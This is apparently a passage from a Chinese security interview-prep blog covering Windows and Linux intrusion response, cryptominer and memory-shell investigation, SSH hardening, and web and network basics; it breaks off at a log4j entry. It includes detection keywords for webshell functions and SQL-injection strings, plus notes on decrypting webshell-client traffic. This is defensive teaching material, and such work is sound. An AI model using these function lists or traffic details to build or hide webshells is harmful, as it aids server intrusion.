<h2 id="08-window系统日志分析"><a href="#08-window系统日志分析" class="headerlink" title="08-window系统日志分析"></a>08-window系统日志分析</h2><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">window日志分为系统日志，应用程序日志和安全日志。在应急溯源中，重点关注安全日志<br><br>日志默认保存位置 <br>系统日志：<span class="hljs-name">C</span>:\Windows\System32\winevt\Logs\System.evtx  <br>应用程序日志：<span class="hljs-name">C</span>:\Windows\System32\winevt\Logs\Application.evtx  <br>安全日志：<span class="hljs-name">C</span>:\Windows\System32\winevt\Logs\Security.evtx<br><span class="hljs-number">1.</span> 不同事件对应不同的ID，可以通过过滤ID快速浏览事件<br><span class="hljs-number">2.</span> 一般是在事件查看其中，对日志时间ID进行筛选。比如在勒索病毒的应急响应中，我们通过事件ID<span class="hljs-number">-4624</span>对登录成功的日志进行筛选，因为勒索病毒一般是通过RDP爆破的方式进行传播的，所以我们重点关注登录类型为<span class="hljs-number">10</span>的登陆成功的日志<br><br>排查流程<br><span class="hljs-number">1.</span>查看开启的服务以及服务对应的端口  tasklist | findstr “PID” //根据netstat 定位出的pid，再通过tasklist命令确认端口对应的进程<br><span class="hljs-number">2.</span>使用Process Explorer 查看进程，当然 d盾也可以查看 可以使用火绒剑等工具进行启动项分析<br></code></pre></td></tr></table></figure>

<h2 id="09-怎么发现服务器中的一句话或者大马"><a href="#09-怎么发现服务器中的一句话或者大马" class="headerlink" title="09-怎么发现服务器中的一句话或者大马"></a>09-怎么发现服务器中的一句话或者大马</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs">d盾查杀网页目录<br>手动查找：通过查看服务器日志，最近被创建、修改的文件等<br>1.查找上传、写入日志 <br>2.webshell扫描工具<br></code></pre></td></tr></table></figure>

<h2 id="10-入侵排查思路"><a href="#10-入侵排查思路" class="headerlink" title="10-入侵排查思路"></a>10-入侵排查思路</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-comment">### 已经被入侵</span><br>一、目的已经达成，木马，后门均已销毁<br><span class="hljs-number">1</span>.既然知道被入侵，定位被入侵的时间点<br><span class="hljs-number">2</span>.如果这个服务器是云服务器，对其进行快照。（目的，封存内存。）<br><span class="hljs-number">3</span>.当定位到时间点，查设备流量信息。找到木马链接信息<br><span class="hljs-number">4</span>.查找系统内对应的日志，找到相关线索<br><span class="hljs-number">5</span>.如果日志被删除，因为机器快照已经建立。使用Winhex对硬盘数据进行恢复<br><br>二、目的没有达成，数据正在回传。木马，后门均在服务器上运行<br><span class="hljs-number">1</span>.下线服务器，封禁攻击<span class="hljs-built_in">IP</span><br><span class="hljs-number">2</span>.Volatility 内存取证 建立快照 提取内存定位到shellcode找到他的<span class="hljs-built_in">IP</span><br><span class="hljs-number">3</span>.如果他们使用常见的<span class="hljs-built_in">C2</span>的工具，我们可以根据流量分析出入侵者的意图<br><span class="hljs-number">4</span>.关闭服务器，或者在防火墙上禁掉他们的<span class="hljs-built_in">IP</span>。登录服务器，对shellcode进行移除<br><span class="hljs-number">5</span>.重启以后进入安全模式，排查注册表 计划任务 服务 放大镜后门 shift后门<br>正在被入侵<br>可能入侵者在尝试进行攻击的时候，下线，然后对机器进行排查<br>比如：弱口令爆破<br><span class="hljs-number">1</span>.弱口令爆破会产生日志，日志一定要采用远程日志系统，例如Linux的rsyslog。开启远程日志系统的好处：不怕日志被攻击者删除<br><span class="hljs-number">2</span>.一定要找到入侵者的源<span class="hljs-built_in">IP</span>，在防火墙下发阻断策略<br></code></pre></td></tr></table></figure>

<h2 id="11-windows入侵排查"><a href="#11-windows入侵排查" class="headerlink" title="11-windows入侵排查"></a>11-windows入侵排查</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-section">## windows入侵排查</span><br><br><span class="hljs-bullet">1.</span> 检查系统账号安全<br><span class="hljs-bullet">2.</span> 历史命令<br><span class="hljs-bullet">3.</span> 检查异常端口、进程<br><span class="hljs-bullet">4.</span> 检查启动项、计划任务、服务<br><span class="hljs-bullet">5.</span> 日志分析<br><span class="hljs-bullet">6.</span> 1. 日志中搜索关键字:如:union,select等<br><span class="hljs-bullet">   2.</span> 分析状态码:<br>  1xx  information<br>  200  successful<br>  300  redirection<br>  4xx  client error<br>  5xx  server error<br>7.查找可疑文件<br></code></pre></td></tr></table></figure>

<h2 id="12-Windows被黑客登录了，怎么找到登录ip"><a href="#12-Windows被黑客登录了，怎么找到登录ip" class="headerlink" title="12-Windows被黑客登录了，怎么找到登录ip"></a>12-Windows被黑客登录了，怎么找到登录ip</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">查看Windows日志、登录日志、远程桌面日志、审核策略与事件查看器<br></code></pre></td></tr></table></figure>

<h2 id="13-Linux入侵排查思路"><a href="#13-Linux入侵排查思路" class="headerlink" title="13-Linux入侵排查思路"></a>13-Linux入侵排查思路</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs">1、账号安全<br>2、历史命令<br>3、检查异常端口<br>4、检查异常进程<br>5、检查开机启动项<br>6、检查定时任务<br>7、检查服务<br>8、检查异常文件<br>9、检查系统日志<br></code></pre></td></tr></table></figure>

<h2 id="14-中挖矿病毒怎么分析解决"><a href="#14-中挖矿病毒怎么分析解决" class="headerlink" title="14-中挖矿病毒怎么分析解决"></a>14-中挖矿病毒怎么分析解决</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">ps</span> <span class="hljs-literal">-aux</span>查看进程分析<br>top分析算力情况，算力特别多的一般是挖矿病毒<br>对流量进行过滤含有矿池服务器的的流量包就是挖矿病毒<br>以及任务计划可以排查出挖矿病毒，然后<span class="hljs-built_in">kill</span>掉进程，<span class="hljs-built_in">rm</span>掉程序<br></code></pre></td></tr></table></figure>

<h2 id="15-中挖矿怎么办？删不掉呢"><a href="#15-中挖矿怎么办？删不掉呢" class="headerlink" title="15-中挖矿怎么办？删不掉呢"></a>15-中挖矿怎么办？删不掉呢</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs">如果情况允许，先下线，并检查挖矿是否有在内网传播，及时下线所有被传播的主机，上机排查攻击痕迹、一般可以从cup占用、可疑进程、开放端口、计划任务、服务项等几个方面进行排查，然后将样本上传到在线分析平台，然后清除挖矿主程序，主要就是双向封禁矿池地址、删除计划任务自启动、删服务，结束恶意进程、删病毒<br><br>1、删不掉的情况，我们先确认下是因为程序正在使用，还是权限不够，根据情况来进行相应措施<br>2、直接降权，降到没有执行权限<br></code></pre></td></tr></table></figure>

<h2 id="16-ssh被爆破的应急解决"><a href="#16-ssh被爆破的应急解决" class="headerlink" title="16-ssh被爆破的应急解决"></a>16-ssh被爆破的应急解决</h2><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">首先日志分析 想到的是`/var/log/secure`，<br>查看登录相关安全日志：`tail -f /var/log/secure`<br>这个日志文件记录了验证和授权方面的信息，只要涉及账号和密码的程序都会记录下来。<br>统计一下登录成功的IP有哪些，看登陆成功的IP是否都是正常用户的，如不是，立刻下线，并检查这台服务器是否有对其他内网服务器进行攻击，对服务器进行检测，是否有添加用户或后门等<br>日志分析--》查看用户安全性--》确定攻击情况--》关闭<span class="hljs-number">22</span>端口<br></code></pre></td></tr></table></figure>

<h2 id="17-SSH如何加固"><a href="#17-SSH如何加固" class="headerlink" title="17-SSH如何加固"></a>17-SSH如何加固</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>、禁止向公网开放端口，若必须开放应限定管理IP地址并加强口令安全审计（口令长度不低于<span class="hljs-number">8</span>位，由数字、大小写字母、特殊字符等至少两种以上组合构成）<br><span class="hljs-attribute">2</span>、更改服务器ssh默认端口<br><span class="hljs-attribute">3</span>、部署入侵检测设备，增强安全防护<br><span class="hljs-attribute">4</span>、同一个ip登录超过<span class="hljs-number">5</span>次错误实行黑名单<br><span class="hljs-attribute">5</span>、禁用root登录<br><span class="hljs-attribute">6</span>、禁用空密码<br><span class="hljs-attribute">7</span>、改用密钥登录<br><span class="hljs-attribute">8</span>、基于受信任主机的无密码登录<br></code></pre></td></tr></table></figure>

<h2 id="18-中了内存马如何排查-（不死马）"><a href="#18-中了内存马如何排查-（不死马）" class="headerlink" title="18-中了内存马如何排查 （不死马）"></a>18-中了内存马如何排查 （不死马）</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">源码检测<br>java中，只有被JVM加载后的类才能被调用，或者在需要时通过反射通知JVM加载。所以特征都在内存中，表现形式为被加载的<span class="hljs-keyword">class</span>，可以通过一些工具或方法获取到JVM的运行时内存中已加载的类， Java本身提供了Instrumentation类来实现运行时注入代码并执行，所以我么可以筛选条件组合进行检测：<br>①新增的或修改的；<br>②没有对应<span class="hljs-keyword">class</span>文件的<br>③<span class="hljs-type">xml</span>配置中没注册的<br>④冰蝎等常见工具使用的<br>⑤filterchain中排第一的<span class="hljs-keyword">filter</span>类<br><br>还有一些比较弱的特征可以用来辅助检测，比如类名称中包含shell或者为随机名，使用不常见的classloader加载的类<br>另外，有一些工具可以辅助检测内存马，如[java-memshell-scanner](https://github.com/c0ny1/java-memshell-scanner)是通过jsp扫描应用中所有的<span class="hljs-keyword">filter</span>和servlet，然后通过名称、对应的<span class="hljs-keyword">class</span>是否存在来判断是否是内存马<br>如果是jsp注入，日志中排查可疑jsp的访问请求。<br>如果是代码执行漏洞，排查中间件的error.<span class="hljs-keyword">log</span>，查看是否有可疑的报错，判断注入时间和方法<br>根据业务使用的组件排查是否可能存在java代码执行漏洞以及是否存在过webshell，排查框架漏洞，反序列化漏洞。<br>如果是servlet或者spring的controller类型，根据上报的webshell的url查找日志（日志可能被关闭，不一定有），根据url最早访问时间确定被注入时间<br>如果是<span class="hljs-keyword">filter</span>或者listener类型，可能会有较多的<span class="hljs-number">404</span>但是带有参数的请求，或者大量请求不同url但带有相同的参数，或者页面并不存在但返回<span class="hljs-number">200</span><br></code></pre></td></tr></table></figure>

<h2 id="19-日志中看到的行为分析"><a href="#19-日志中看到的行为分析" class="headerlink" title="19-日志中看到的行为分析"></a>19-日志中看到的行为分析</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">分析方法：<br>蚁剑 菜刀  <br>post一个PHP的函数  这些函数可以对文件进行操作  可以对数据库进行操作  <br>如果特征编码 例如<span class="hljs-built_in">base64</span> rot13 通过该种编码的解码来实现流量的解密<br><br>冰蝎<br>aes-128加密<br>在开始连接进行密钥协商的时候 抓取冰蝎流量密钥值<br>通过冰蝎密钥 对加密的流量进行解密在进行行为分析<br></code></pre></td></tr></table></figure>

<h2 id="20-应急响应的六个过程？"><a href="#20-应急响应的六个过程？" class="headerlink" title="20-应急响应的六个过程？"></a>20-应急响应的六个过程？</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">准备-检测-抑制-根除-恢复-跟踪总结<br></code></pre></td></tr></table></figure>

<h2 id="21-被上传一句话、日志被清除、-已经免杀"><a href="#21-被上传一句话、日志被清除、-已经免杀" class="headerlink" title="21-被上传一句话、日志被清除、 已经免杀"></a>21-被上传一句话、日志被清除、 已经免杀</h2><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q">一般都有备份文件，可以提取一下备份文件的<span class="hljs-built_in">md5</span>值，再把现在的<span class="hljs-built_in">md5</span>值提取出来对比一下，因为文件发生改变 <span class="hljs-built_in">md5</span>就会改变  通过软件（文件对比器）对比一下，看看有没有不同的地方  初步缩写范围 基本就可以确认恶意文件<br></code></pre></td></tr></table></figure>

<h2 id="22-Linux系统中毒-如何应急？"><a href="#22-Linux系统中毒-如何应急？" class="headerlink" title="22-Linux系统中毒 如何应急？"></a>22-Linux系统中毒 如何应急？</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span>、检查用户及密码文件<span class="hljs-regexp">/etc/</span>passwd、<span class="hljs-regexp">/etc/</span>shadow 是否存在多余帐号，主要看一下帐号<br>后面是否是 nologin,如果没有 nologin 就要注意；<br><span class="hljs-number">2</span>、通过 who 命令查看当前登录用户（tty 本地登陆 pts 远程登录）、w 命令查看系统<br>信息，想知道某一时刻用户的行为、uptime查看登陆多久、多少用户，负载；<br><span class="hljs-number">3</span>、修改<span class="hljs-regexp">/etc/</span>profile的文件，在尾部添加相应显示时间、日期、ip、命令脚本代码，这样输入history命令就会详细显示攻击者 ip、时间历史命令等；<br><span class="hljs-number">4</span>、用 netstat -antlp|more命令分析可疑端口、IP、PID，查看下 pid 所对应的进程文件路径，运行ls -l <span class="hljs-regexp">/proc/</span><span class="hljs-variable">$PID</span><span class="hljs-regexp">/exe 或 file /</span>proc<span class="hljs-regexp">/$PID/</span>exe（<span class="hljs-variable">$PID</span> 为对应的pid 号）；<br><span class="hljs-number">5</span>、使用ps命令，分析进程 ps aux | grep pid<br><span class="hljs-number">6</span>、使用 vi <span class="hljs-regexp">/etc/i</span>nittab 查看系统当前运行级别，通过运行级别找到<span class="hljs-regexp">/etc/</span>rc.d/rc[<span class="hljs-number">0</span>~<span class="hljs-number">6</span>].d对应目录是否存在可疑文件；<br><span class="hljs-number">7</span>、看一下crontab定时任务是否存在可疑启用脚本；<br><span class="hljs-number">8</span>、使用chkconfig --list 查看是否存在可疑服务；<br><span class="hljs-number">9</span>、通过grep awk命令分析<span class="hljs-regexp">/var/</span>log/secure安全日志里面是否存在攻击痕迹；<br><span class="hljs-number">10</span>、chkrootkit、rkhunter、Clamav 病毒后门查杀工具对 Linux 系统文件查杀；<br><span class="hljs-number">11</span>、如果有 Web 站点，可通过 D 盾、河马查杀工具进行查杀或者手工对代码按脚本木马关键字、关键涵数（evel、system、shell_exec、exec、passthru system、popen）进行查杀Webshell 后门。<br></code></pre></td></tr></table></figure>

<h1 id="0x08-安全防御篇"><a href="#0x08-安全防御篇" class="headerlink" title="0x08.安全防御篇"></a>0x08.安全防御篇</h1><h2 id="00-企业内部安全"><a href="#00-企业内部安全" class="headerlink" title="00-企业内部安全"></a>00-企业内部安全</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"> 信息安全管理的本质就是输入和输出。一般防范的风险为物理威胁和网络威胁。<br>防范风险可以从制度和流程（人员入离职流程、权限申请流程）、人员配备和知识积累、风险防范（物理威胁：门禁、监控、禁止USB设备接入、封闭<span class="hljs-built_in">PC</span>、定时巡检；网络威胁：部署行为管控设备、可靠的网络结构、<span class="hljs-built_in">IP</span>和MAC地址绑定，将网络行为分组、限制不必要的软件和通信协议、定期审核日志）<br></code></pre></td></tr></table></figure>

<h2 id="01-说一下ISO27000"><a href="#01-说一下ISO27000" class="headerlink" title="01-说一下ISO27000"></a>01-说一下ISO27000</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ISO27000</span>是国际知名的信息安全管理体系标准，适用于整个企业，不仅仅是IT部门，还包括业务部门、财务、人事等部门。引入信息安全管理体系就可以协调各个方面信息管理，从而使管理更为有效。保证信息安全不是仅有一个防火墙，或找一个<span class="hljs-number">24</span>小时提供信息安全服务的公司就可以达到的。它需要全面的综合管理。<br></code></pre></td></tr></table></figure>

<h2 id="02-等级保护制度"><a href="#02-等级保护制度" class="headerlink" title="02-等级保护制度"></a>02-等级保护制度</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">《信息安全等级保护管理办法》是为规范信息安全等级保护管理，提高信息安全保障能力和水平，维护国家安全、社会稳定和公共利益，保障和促进信息化建设，根据《中华人民共和国计算机信息系统安全保护条例》等有关法律法规而制定的办法。<br></code></pre></td></tr></table></figure>

<h2 id="03-日志分析ELK的使用和分析"><a href="#03-日志分析ELK的使用和分析" class="headerlink" title="03-日志分析ELK的使用和分析"></a>03-日志分析ELK的使用和分析</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">- Elasticsearch是个开源分布式搜索引擎，它的特点有：分布式，零配置，自动发现，索引自动分片，索引副本机制，restful风格接口，多数据源，自动搜索负载等。<br>- Logstash是一个完全开源的工具，他可以对你的日志进行收集、过滤，并将其存储供以后使用（如，搜索）。<br>- Kibana也是开源和免费的工具，它Kibana可为Logstash和ElasticSearch提供的日志分析友好的 Web 界面，可以帮助您汇总、分析和搜索重要数据日志。<br><br>参考：https:<span class="hljs-regexp">//</span>www.zhihu.com<span class="hljs-regexp">/question/</span><span class="hljs-number">21427267</span><br></code></pre></td></tr></table></figure>

<h2 id="04-常见的安全设备"><a href="#04-常见的安全设备" class="headerlink" title="04-常见的安全设备"></a>04-常见的安全设备</h2><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-bullet">- </span>防火墙 utm 负载均衡设备<br><span class="hljs-bullet">- </span>IPS IDS(HIDS基于主机型入侵检测系统)<br><span class="hljs-bullet">- </span>堡垒机<br><span class="hljs-bullet">- </span>蜜罐<br><span class="hljs-bullet">- </span>网闸<br><span class="hljs-bullet">- </span>waf<br><span class="hljs-bullet">- </span>扫描器<br><span class="hljs-bullet">- </span>soc(ossim开源安全信息管理系统)<br></code></pre></td></tr></table></figure>

<h1 id="0x09-Web"><a href="#0x09-Web" class="headerlink" title="0x09.Web"></a>0x09.Web</h1><h2 id="00-WEB常用的加密算法？"><a href="#00-WEB常用的加密算法？" class="headerlink" title="00-WEB常用的加密算法？"></a>00-WEB常用的加密算法？</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">非对称加密  RSA、ElGamal、Rabin<br>对称加密 DES、3DES、AES<br>散列算法 MD5 SHA <span class="hljs-built_in">base64</span><br></code></pre></td></tr></table></figure>

<h2 id="01-网络七层协议？"><a href="#01-网络七层协议？" class="headerlink" title="01-网络七层协议？"></a>01-网络七层协议？</h2><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stata">从上到下：<br>应用层（报文）：包含用户应用程序和协议；<br>表示层（报文）：主要解决用户信息的语法表示问题，如会话加密与数据压缩、语法表示与连接管理；<br>会话层（报文）：会话链接的恢复与释放、对会话进行分段，同步等<br>传输层（段）：提供端到端之间可靠透明的传输。分段与重组、差错控制及流量控制，保证数据传输的完整性和正确性；<br>网络层（分组）：路径的选择，网络连接的多路复用、差错的检测与恢复、排序与流量控制、服务选择；<br>数据链路层（帧）：把不可靠信道变为可靠信道，将比特组织成帧，在链路上提供点到点的帧传输，差错检测、流量控制等<br>物理层（比特流）：提供物理通路，二进制数据比特流传输、定义机械、电气特性和接口等。<br><br>各层使用的设备：<br>网关：应用层、传输层（网关在传输层上以实现网络互连，是最复杂的网络互联设备，仅用于两个高层协议不同的网络互连。网关的结构和路由器相似，不同的是互连层，网关既可以用于广域网互连，也可以用于局域网互连）<br>路由器：网络层 （路由选择、存储转发）<br>交换机 ：数据链路层、网络层（识别数据中的<span class="hljs-keyword">MAC</span>地址信息，根据<span class="hljs-keyword">MAC</span>地址进行转发，并将这些<span class="hljs-keyword">MAC</span>地址与对应的端口记录在自己内部的一个地址表中）<br>网桥： 数据链路层（将两个LAN连起来，根据<span class="hljs-keyword">MAC</span>地址来转发帧）<br>集线器：物理层（纯硬件设备，主要用来连接计算机等网络终端）<br>中继器： 物理层（在比特级别对网络信号进行再生和重定向时，从而使得它们能够在网络上传输更长的距离）<br></code></pre></td></tr></table></figure>

<h2 id="02-https的建立过程"><a href="#02-https的建立过程" class="headerlink" title="02-https的建立过程"></a>02-https的建立过程</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css">https 的建立过程<span class="hljs-selector-tag">a</span>、客户端发送请求到服务器端 <br><span class="hljs-selector-tag">b</span>.服务器端返回证书和公开密钥，公开密钥作为证书的一部分而存在 <br>c.客户端验证证书和公开密钥的有效性，如果有效，则生成共享密钥并使用公开密钥加密发送到服务器端 <br>d.服务器端使用私有密钥解密数据，并使用收到的共享密钥加密数据，发送到客户端 <br>e.客户端使用共享密钥解密数据 <br>f<span class="hljs-selector-class">.SSL</span>加密建立 <br></code></pre></td></tr></table></figure>

<h2 id="03-HTTP-Keep-Alive的作用"><a href="#03-HTTP-Keep-Alive的作用" class="headerlink" title="03-HTTP Keep-Alive的作用"></a>03-HTTP Keep-Alive的作用</h2><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sqf">作用：Keep-<span class="hljs-built_in">Alive</span>：使客户端到服务器端的连接持续有效，当出现对服务器的后继请求时，Keep-<span class="hljs-built_in">Alive</span>功能避免了建立或者重新建立连接。Web服务器，基本上都支持HTTP Keep-<span class="hljs-built_in">Alive</span>。<br><br>缺点：对于提供静态内容的网站来说，这个功能通常很有用。但是，对于负担较重的网站来说，虽然为客户保留打开的连 接有一定的好处，但它同样影响了性能，因为在处理暂停期间，本来可以释放的资源仍旧被占用。当Web服务器和应用服务器在同一台机器上运行时，Keep- <span class="hljs-built_in">Alive</span>功能对资源利用的影响尤其突出。<br><br>解决：Keep-<span class="hljs-built_in">Alive</span>: timeout=<span class="hljs-number">5</span>, <span class="hljs-built_in">max</span>=<span class="hljs-number">100</span><br>timeout：过期时间<span class="hljs-number">5</span>秒（对应httpd.conf里的参数是：KeepAliveTimeout），<span class="hljs-built_in">max</span>是最多一百次请求，强制断掉连接。就是在timeout时间内又有新的连接过来，同时<span class="hljs-built_in">max</span>会自动减<span class="hljs-number">1</span>，直到为<span class="hljs-number">0</span>，强制断掉 <br></code></pre></td></tr></table></figure>

<h2 id="04-Https的工作原理"><a href="#04-Https的工作原理" class="headerlink" title="04-Https的工作原理"></a>04-Https的工作原理</h2><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs arcade">工作大致过程<br><span class="hljs-number">1</span>、客户端发起HTTPS请求<br>浏览器里面输入一个HTTPS网址，然后连接到服务端的<span class="hljs-number">443</span>端口上。注意这个过程中客户端会发送一个密文族给服务端，密文族是浏览器所支持的加密算法的清单。<br><br><span class="hljs-number">2</span>、服务端配置<br>采用HTTPS协议的服务器必须要有一套数字证书，可以自己制作，也可以向组织申请。区别就是自己颁发的证书需要客户端验证通过才可以继续访问，而使用受信任的公司申请的证书则不会弹出提示页面。这套证书其实就是一对公钥和私钥，可以这么理解，公钥就是一把锁头，私钥就是这把锁的钥匙，锁头可以给别人对某个东西进行加锁，但是加锁完毕之后，只有持有这把锁的钥匙才可以解锁看到加锁的内容。前面说过客户端会传送密文族给服务端，服务端则会从这些密文族中，挑选出一个<br><br><span class="hljs-number">3</span>、传送证书<br>这个证书其实就是公钥，只是包含了很多信息，如证书的颁发机构、过期时间等等。<br><br><span class="hljs-number">4</span>、客户端解析证书<br>这部分工作是由客户端的TLS来完成的，首先会验证公钥是否有效，如颁发机构、过期时间等等，如果发现异常则会弹出一个警告框，提示证书存在问题。如果证书没有问题，那么就生成一个随机值，然后用证书对该随机值进行加密。注意一下上面提到的<span class="hljs-string">&quot;发现异常&quot;</span>。证书中会包含数字签名，该数字签名是加密过的，是用颁发机构的私钥对本证书的公钥、名称及其他信息做<span class="hljs-built_in">hash</span>散列加密而生成的。客户端浏览器会首先找到该证书的根证书颁发机构，如果有，则用该根证书的公钥解密服务器下发的证书，如果不能正常解密，则就是<span class="hljs-string">&quot;发现异常&quot;</span>，说明该证书是伪造的。<br><br><span class="hljs-number">5</span>、传送加密信息<br>这部分传送的是用证书加密后的随机值，目的就是让服务端得到这个随机值，然后客户端和服务端的通信就可以通过这个随机值来进行加密和解密了。<br><br><span class="hljs-number">6</span>、服务端解密信息<br>服务端用私钥解密后，得到了客户端传过来的随机值，至此一个非对称加密的过程结束，看到TLS利用非对称加密实现了身份认证和密钥协商。然后把内容通过该值进行对称加密。<br><br><span class="hljs-number">7</span>、传输加密后的信息<br>这部分是服务端用随机值加密后的信息，可以在客户端被还原。<br><br><span class="hljs-number">8</span>、客户端解密信息<br>客户端用之前生成的随机值解密服务端传送过来的信息，于是获取了解密后的内容，至此一个对称加密的过程结束，看到对称加密是用于对服务器待传送给客户端的数据进行加密用的。整个过程即使第三方监听了数据，也束手无策。<br></code></pre></td></tr></table></figure>

<h2 id="05-最近新出的漏洞"><a href="#05-最近新出的漏洞" class="headerlink" title="05-最近新出的漏洞"></a>05-最近新出的漏洞</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">log4j漏洞：（建议自己复现一次）<br>成因：Apache Log4j 是一个基于<span class="hljs-keyword">Java的日志记录工具 </span> 